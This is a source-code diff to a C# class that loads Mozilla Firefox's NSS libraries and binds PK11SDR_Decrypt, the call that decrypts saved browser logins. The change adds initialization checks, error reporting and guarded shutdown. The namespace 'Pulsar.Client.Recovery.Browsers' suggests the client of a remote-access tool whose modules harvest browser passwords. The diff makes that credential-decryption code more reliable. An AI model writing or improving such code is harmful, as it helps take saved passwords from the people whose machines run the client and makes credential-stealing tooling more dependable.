@@ -28,19 +28,45 @@ namespace Pulsar.Client.Recovery.Browsers
 
         private IntPtr NSS3;
         private IntPtr Mozglue;
+        public bool IsInitialized { get; private set; }
+        public string LastError { get; private set; }
 
         public long Init(string configDirectory)
         {
-            string mozillaPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Mozilla Firefox\");
-            Mozglue = NativeMethods.LoadLibrary(Path.Combine(mozillaPath, "mozglue.dll"));
-            NSS3 = NativeMethods.LoadLibrary(Path.Combine(mozillaPath, "nss3.dll"));
-            IntPtr initProc = NativeMethods.GetProcAddress(NSS3, "NSS_Init");
-            IntPtr shutdownProc = NativeMethods.GetProcAddress(NSS3, "NSS_Shutdown");
-            IntPtr decryptProc = NativeMethods.GetProcAddress(NSS3, "PK11SDR_Decrypt");
-            NSS_Init = (NssInit)Marshal.GetDelegateForFunctionPointer(initProc, typeof(NssInit));
-            PK11SDR_Decrypt = (Pk11sdrDecrypt)Marshal.GetDelegateForFunctionPointer(decryptProc, typeof(Pk11sdrDecrypt));
-            NSS_Shutdown = (NssShutdown)Marshal.GetDelegateForFunctionPointer(shutdownProc, typeof(NssShutdown));
-            return NSS_Init(configDirectory);
+            try
+            {
+                string mozillaPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Mozilla Firefox\");
+                Mozglue = NativeMethods.LoadLibrary(Path.Combine(mozillaPath, "mozglue.dll"));
+                NSS3 = NativeMethods.LoadLibrary(Path.Combine(mozillaPath, "nss3.dll"));
+                if (Mozglue == IntPtr.Zero || NSS3 == IntPtr.Zero)
+                {
+                    LastError = "Mozilla NSS libraries are unavailable.";
+                    return -1;
+                }
+
+                IntPtr initProc = NativeMethods.GetProcAddress(NSS3, "NSS_Init");
+                IntPtr shutdownProc = NativeMethods.GetProcAddress(NSS3, "NSS_Shutdown");
+                IntPtr decryptProc = NativeMethods.GetProcAddress(NSS3, "PK11SDR_Decrypt");
+                if (initProc == IntPtr.Zero || shutdownProc == IntPtr.Zero || decryptProc == IntPtr.Zero)
+                {
+                    LastError = "Required Mozilla NSS exports are unavailable.";
+                    return -1;
+                }
+
+                NSS_Init = (NssInit)Marshal.GetDelegateForFunctionPointer(initProc, typeof(NssInit));
+                PK11SDR_Decrypt = (Pk11sdrDecrypt)Marshal.GetDelegateForFunctionPointer(decryptProc, typeof(Pk11sdrDecrypt));
+                NSS_Shutdown = (NssShutdown)Marshal.GetDelegateForFunctionPointer(shutdownProc, typeof(NssShutdown));
+                long result = NSS_Init(configDirectory);
+                IsInitialized = result == 0;
+                if (!IsInitialized)
+                    LastError = "Mozilla NSS initialization failed.";
+                return result;
+            }
+            catch (Exception ex)
+            {
+                LastError = ex.GetType().Name;
+                return -1;
+            }
         }
 
         public string Decrypt(string cypherText)
@@ -107,9 +133,14 @@ namespace Pulsar.Client.Recovery.Browsers
         {
             if (disposing)
             {
-                NSS_Shutdown();
-                NativeMethods.FreeLibrary(NSS3);
-                NativeMethods.FreeLibrary(Mozglue);
+                if (IsInitialized && NSS_Shutdown != null)
+                {
+                    try { NSS_Shutdown(); } catch { }
+                }
+                if (NSS3 != IntPtr.Zero)
+                    NativeMethods.FreeLibrary(NSS3);
+                if (Mozglue != IntPtr.Zero)
+                    NativeMethods.FreeLibrary(Mozglue);
             }
         }
     }
